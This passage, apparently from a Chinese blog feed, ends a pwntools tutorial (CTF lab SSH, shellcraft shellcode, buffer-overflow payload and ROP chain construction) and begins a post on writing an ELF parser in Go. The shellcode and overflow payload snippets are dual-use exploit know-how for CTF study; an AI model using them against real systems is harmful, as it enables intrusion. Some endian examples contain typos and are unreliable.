class="line">关闭连接：sh.close()</span><br></pre></td></tr></table></figure><p>pwn库中最常用的部分之一是，它允许您轻松地连接到Web服务并执行操作。pwntools的<a href="https://docs.pwntools.com/en/stable/intro.html" target="_blank" rel="noopener">入门文档</a>中包含的一个示例是连接到overthewire的 bandit CTF实验室。Overthewire是一款在线信息安全CTF通关网站，你可以在线Hacking,并为任何刚接触Linux / CLI 等的初级人员提供了手把手教学。<br>我们可以利用pwn库创建到主机的SSH连接，并对其运行任意命令。每个bandit级别的目标是找到进入下一级别的密码。例如：利用pwntools，您可以开发一个脚本来将SSH连接到目标主机，并运行一系列自动信息收集探针，以确定如何以最佳方式对其进行攻击。<br>一个不错的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Connect to the target</span><br><span class="line">shell = ssh(&apos;bandit0&apos;, &apos;bandit.labs.overthewire.org&apos;, password=&apos;bandit0&apos;, port=2220)</span><br><span class="line"># Create an initial process</span><br><span class="line">sh = shell.run(&apos;sh&apos;)</span><br><span class="line"># Send the process arguments</span><br><span class="line">sh.sendline(&apos;ls -la&apos;)</span><br><span class="line"># Receive output from the executed command</span><br><span class="line">sh.recvline(timeout=5)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"># Obtain the first flag (password for bandit1)</span><br><span class="line">sh.sendline(&apos;cat readme&apos;)</span><br><span class="line"># Print the flag</span><br><span class="line">sh.recvline(timeout=5)</span><br></pre></td></tr></table></figure><h3 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure><h3 id="汇编和反汇编"><a href="#汇编和反汇编" class="headerlink" title="汇编和反汇编"></a>汇编和反汇编</h3><p>汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;)</span><br><span class="line">&apos;\x90&apos;</span><br><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;, arch=&apos;arm&apos;)</span><br><span class="line">&apos;\x00\xf0 \xe3&apos;</span><br></pre></td></tr></table></figure><p>可以使用context来指定cpu类型以及操作系统。context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; context.arch      = &apos;i386&apos;</span><br><span class="line">&gt;&gt;&gt; context.os        = &apos;linux&apos;</span><br><span class="line">&gt;&gt;&gt; context.endian    = &apos;little&apos;</span><br><span class="line">&gt;&gt;&gt; context.word_size = 32</span><br></pre></td></tr></table></figure><p>一般来说我们设置context只需要简单的一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</span><br></pre></td></tr></table></figure><p>使用disasm进行反汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm(&apos;6a0258cd80ebf9&apos;.decode(&apos;hex&apos;))</span><br><span class="line">   0:   6a 02                   push   0x2</span><br><span class="line">   2:   58                      pop    eax</span><br><span class="line">   3:   cd 80                   int    0x80</span><br><span class="line">   5:   eb f9                   jmp    0x0</span><br></pre></td></tr></table></figure><p>注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils</p><h3 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.i386.nop().strip(&apos;\n&apos;)</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; print shellcraft.i386.linux.sh()</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>结合asm可以可以得到最终的pyaload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br></pre></td></tr></table></figure><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等</p><h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.search(&apos;/bin/sh&apos;).next())# 字符串/bin/sh的地址</span><br></pre></td></tr></table></figure><h3 id="整数pack与数据unpack"><a href="#整数pack与数据unpack" class="headerlink" title="整数pack与数据unpack"></a>整数pack与数据unpack</h3><p>pack：p32，p64<br>unpack：u32，u64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&apos;./level0&apos;)</span><br><span class="line">sys_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">payload = &apos;a&apos; * (0x80 + 0x8) + p64(sys_addr)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>还可以调整大端序和小端序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Create some variable with an address</span><br><span class="line">addr = 0xabcdef12</span><br><span class="line"># 32-bit: Big Endian</span><br><span class="line">p32(addr, endian=&quot;big&quot;</span><br><span class="line"># 32-bit: Little Endian</span><br><span class="line">p32(addr, endian=&quot;big&quot;</span><br><span class="line"># 32-bit: Default is Little Endian</span><br><span class="line">p32(addr)</span><br><span class="line"># 64-bit: Big Endian</span><br><span class="line">p64(addr, endian=&quot;big&quot;)</span><br><span class="line"># 64-bit: Little Endian</span><br><span class="line">p64(addr, endian=&quot;small&quot;)</span><br><span class="line"># 64-bit: Default is Little Endian</span><br><span class="line">p64(addr)</span><br></pre></td></tr></table></figure><h3 id="ROP链生成器"><a href="#ROP链生成器" class="headerlink" title="ROP链生成器"></a>ROP链生成器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&apos;ropasaurusrex&apos;)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(0, elf.bss(0x80))</span><br><span class="line">rop.dump()</span><br><span class="line"># [&apos;0x0000:        0x80482fc (read)&apos;,</span><br><span class="line">#  &apos;0x0004:       0xdeadbeef&apos;,</span><br><span class="line">#  &apos;0x0008:              0x0&apos;,</span><br><span class="line">#  &apos;0x000c:        0x80496a8&apos;]</span><br><span class="line">str(rop)</span><br><span class="line"># &apos;\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08&apos;</span><br></pre></td></tr></table></figure><p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。</p><p>因为ROP对象实现了<strong>getattr</strong>的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。<br> 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p><ul><li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列，即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget</li><li>unresolve(value) : 给出一个地址，反解析出符号</li></ul><h3 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h3><p>如果需要输出一些信息,最好使用pwntools自带的,因为和pwntools本来的格式吻合,看起来也比较舒服,用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">some_str = &quot;hello, world&quot;</span><br><span class="line">log.info(some_str)</span><br></pre></td></tr></table></figure><p>其中的info代表是log等级，也可以使用其他log等级</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从理解ELF到手写Readelf解析器（一）</title>
      <link href="/2020/04/12/%E2%94%A4%E2%95%99%E2%94%94%CF%86%E2%95%9C%CE%93ELF%E2%95%A1%E2%95%9C%E2%95%A9%E2%95%93%E2%95%A8%E2%94%A4Readelf%E2%95%9C%CE%93%E2%95%AC%C3%B7%E2%95%9E%E2%89%88%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/"/>
      <url>/2020/04/12/%E2%94%A4%E2%95%99%E2%94%94%CF%86%E2%95%9C%CE%93ELF%E2%95%A1%E2%95%9C%E2%95%A9%E2%95%93%E2%95%A8%E2%94%A4Readelf%E2%95%9C%CE%93%E2%95%AC%C3%B7%E2%95%9E%E2%89%88%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[<p>（本文所有代码均基于Go语言，ELF文件为32位）</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人普通大二学生水平有限，可能错误许多的，还希望大佬们能帮指证修改</p><p>项目地址：<a href="https://github.com/suyucheng-lz/ELF32_Read" target="_blank" rel="noopener">https://github.com/suyucheng-lz/ELF32_Read</a></p><h2 id="目前实现的效果"><a href="#目前实现的效果" class="headerlink" title="目前实现的效果"></a>目前实现的效果</h2><h3 id="readelf的解析数据："><a href="#readelf的解析数据：" class="headerlink" title="readelf的解析数据："></a>readelf的解析数据：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share$ readelf -h hello</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&apos;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x8048310</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6112 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 28</span><br><span class="line">  </span><br><span class="line">Elf file type is EXEC (Executable file)</span><br><span class="line">Entry point 0x8048310</span><br><span class="line">There are 9 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span><br><span class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br><span class="line">  LOAD           0x000000 0x08048000 0x08048000 0x005c8 0x005c8 R E 0x1000</span><br><span class="line">  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4</span><br><span class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x0004d0 0x080484d0 0x080484d0 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1</span><br><span class="line">  </span><br><span class="line">There are 31 section headers, starting at offset 0x17e0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004c 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048268 000268 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048274 000274 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048294 000294 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             0804829c 00029c 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482ac 0002ac 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484b8 0004b8 000015 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 00002c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        080484fc 0004fc 0000cc 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016d3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014a4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>我实现的效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">There are 31 section headers, starting at offset 0x17e0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004c 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048268 000268 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048274 000274 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048294 000294 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             0804829c 00029c 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482ac 0002ac 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484b8 0004b8 000015 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 00002c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        080484fc 0004fc 0000cc 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016d3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014a4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先在解析之前， 必须对数据类型格式声明一下</p><table><thead><tr><th align="center">名称</th><th align="center">大小（byte）</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Elf32_Addr</td><td align="center">4</td><td align="center">无符号程序地址</td></tr><tr><td align="center">Elf32_Half</td><td align="center">2</td><td align="center">无符号中等整数</td></tr><tr><td align="center">Elf32_Off</td><td align="center">4</td><td align="center">无符号文件偏移</td></tr><tr><td align="center">Elf32_SWord</td><td align="center">4</td><td align="center">有符号大整数</td></tr><tr><td align="center">Elf32_Word</td><td align="center">4</td><td align="center">无符号大整数</td></tr><tr><td align="center">unsigned char</td><td align="center">1</td><td align="center">无符号笑整数</td></tr></tbody></table><p>我在Go语言里面如此定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EI_NIDENT = <span class="number">16</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Addr = <span class="keyword">uint32</span><span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Half = <span class="keyword">uint16</span><span class="comment">//2个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Off = <span class="keyword">uint32</span><span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_SWord = <span class="keyword">int32</span><span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Word = <span class="keyword">uint32</span><span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> u_char = <span class="keyword">byte</span><span class="comment">//1个字节（uint8)</span></span><br></pre></td></tr></table></figure><p>一个ELF文件可以被标记为一下几种类型：</p><ul><li>ET_NONE：未知类型。这个标记表明文件类型不确定，或者还未定义</li><li>ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据</li><li>ET_EXEC：可执行文件。ELF类型为executable，表明这个文件被标记为可执行文件。这种类型的文件也称为程序，是一个进程开始执行的入口</li><li>ET_DYN：共享目标文件。ELF类型为dynamic，意味着该文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中</li><li>ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因</li></ul><p>对于一个ELF文件主要由以下这几个部分组成：</p><ul><li><p>ELF Header：<strong>ELF头部</strong>。每个ELF文件都必须存在一个ELF_Header,这里存放了很多重要的信息用来描述整个文件的组织,如: 版本信息,入口信息,偏移信息等。程序执行也必须依靠其提供的信息</p></li><li><p>Program Header Table：<strong>程序头部表。</strong>可选的一个表，用于告诉系统如何在内存中创建映像,在图中也可以看出来,有程序头部表才有段,有段就必须有程序头部表。其中存放各个段的基本信息(包括地址指针)</p></li><li><p>Section Header Table：<strong>节区头部表</strong>。类似与Program_Header_Table,但与其相对应的是节区(Section)</p></li><li><p>Section：<strong>节区</strong>。将文件分成一个个节区，每个节区都有其对应的功能，如符号表，哈希表等</p></li><li><p>Segment：<strong>段</strong>。就是将文件分成一段一段映射到内存中。段中通常包括一个或多个节区</p></li></ul><blockquote><p>每个节区都应该是前后相连的，且不可有重叠。即在一个地址上的字节只能属于一个节区</p></blockquote><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解ELF Header的结构体定义开始：</p><table><thead><tr><th align="center">名称</th><th align="center">类型</th></tr></thead><tbody><tr><td align="center">e_ident[EI_NIDENT]</td><td align="center">unsigned char</td></tr><tr><td align="center">e_type</td><td align="center">Elf32_Half</td></tr><tr><td align="center">e_machine</td><td 